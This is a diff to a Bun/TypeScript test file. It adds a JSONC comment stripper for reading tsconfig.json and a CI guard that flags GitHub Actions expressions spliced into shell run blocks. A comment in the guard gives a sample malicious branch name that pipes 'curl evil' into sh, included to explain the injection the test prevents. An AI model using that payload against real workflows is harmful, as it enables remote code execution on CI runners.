@@ -37,17 +37,39 @@ function readProperty(source: object, name: string): unknown {
 
 function readCompilerOptions(parsed: unknown): object {
   if (typeof parsed !== "object" || parsed === null) {
-    throw new Error("tsconfig.base.json did not parse to an object");
+    throw new Error("tsconfig.json did not parse to an object");
   }
   const options = readProperty(parsed, "compilerOptions");
   if (typeof options !== "object" || options === null) {
-    throw new Error("tsconfig.base.json has no compilerOptions object");
+    throw new Error("tsconfig.json has no compilerOptions object");
   }
   return options;
 }
 
-test("tsconfig.base.json declares every mandated compiler option", async () => {
-  const parsed: unknown = await Bun.file(new URL("../tsconfig.base.json", import.meta.url)).json();
+/**
+ * `tsconfig.json` is JSONC — TypeScript accepts comments in it, and this one carries the reason the
+ * strict block may not be loosened, which is worth more in the file than in a doc nobody opens
+ * next to it. `Bun.file().json()` is strict JSON and rejects those comments, so the test reads the
+ * file the way the compiler does.
+ *
+ * String-aware rather than a bare `//` regex: a `//` inside a string value is data, and a stripper
+ * that does not know the difference corrupts the config it is trying to read.
+ */
+function stripJsonComments(source: string): string {
+  // One pass, three alternatives in order: a double-quoted string with escapes, a line comment, a
+  // block comment. Strings match first and are returned verbatim, so a `//` inside a value stays
+  // data. Written as a single regular expression rather than a character loop because
+  // `noUncheckedIndexedAccess` — the very flag this test guards — types every `source[i]` as
+  // `string | undefined`, and a loop that fights the strictness it is verifying is the wrong shape.
+  return source.replace(
+    /("(?:\\.|[^"\\])*")|\/\/[^\n]*|\/\*[\s\S]*?\*\//g,
+    (_match, str: string | undefined) => str ?? "",
+  );
+}
+
+test("tsconfig.json declares every mandated compiler option", async () => {
+  const raw = await Bun.file(new URL("../tsconfig.json", import.meta.url)).text();
+  const parsed: unknown = JSON.parse(stripJsonComments(raw));
   const compilerOptions = readCompilerOptions(parsed);
 
   for (const [option, expected] of Object.entries(REQUIRED_COMPILER_OPTIONS)) {
@@ -64,6 +86,46 @@ test("tsconfig.base.json declares every mandated compiler option", async () => {
 async function readRepoFile(relative: string): Promise<string> {
   return Bun.file(new URL(`../${relative}`, import.meta.url)).text();
 }
+
+test("no workflow splices an expression into a shell script", async () => {
+  // `${{ github.event.pull_request.head.ref }}` inside a `run:` block is substituted before the
+  // shell parses the line, so a branch named `x"; curl evil | sh; #` executes. This repo is public,
+  // so anyone can open a PR and choose that name. Passing the value through `env:` makes it one
+  // argument whatever it contains.
+  //
+  // Walks indentation rather than matching the block with one regular expression. The obvious
+  // pattern — `run: \|[\s\S]*?(?=...|$)` — is silently vacuous: under the `m` flag `$` matches at
+  // the end of *every* line, so the lazy quantifier stops immediately and the guard inspects the
+  // string "run: |" and nothing else. It passed a planted injection before this was rewritten,
+  // which is LD-11's point about proving a gate against the shape it actually guards.
+  // `dot: true` is load-bearing: Bun.Glob.scan skips dot-directories by default, so without it the
+  // scan never enters `.github/` and yields nothing. The guard passed a planted injection twice
+  // before this flag was added — once for the regex above, once for this.
+  const workflows: string[] = [];
+  for await (const path of new Bun.Glob(".github/workflows/*.yml").scan({ cwd: ".", dot: true })) {
+    workflows.push(path);
+  }
+  expect(workflows.length).toBeGreaterThan(0);
+
+  const offenders: string[] = [];
+  for (const path of workflows) {
+    const lines = (await readRepoFile(path)).split("\n");
+    let blockIndent: number | undefined;
+    for (const line of lines) {
+      const indent = line.length - line.trimStart().length;
+      if (blockIndent !== undefined && line.trim() !== "" && indent <= blockIndent) {
+        blockIndent = undefined;
+      }
+      if (blockIndent !== undefined && line.includes("${{")) {
+        offenders.push(`${path}: ${line.trim()}`);
+      }
+      if (/^ *run: \|/.test(line)) {
+        blockIndent = indent;
+      }
+    }
+  }
+  expect(offenders).toEqual([]);
+});
 
 test("CI runs on every pull request, not only those targeting main", async () => {
   const workflow = await readRepoFile(".github/workflows/ci.yml");
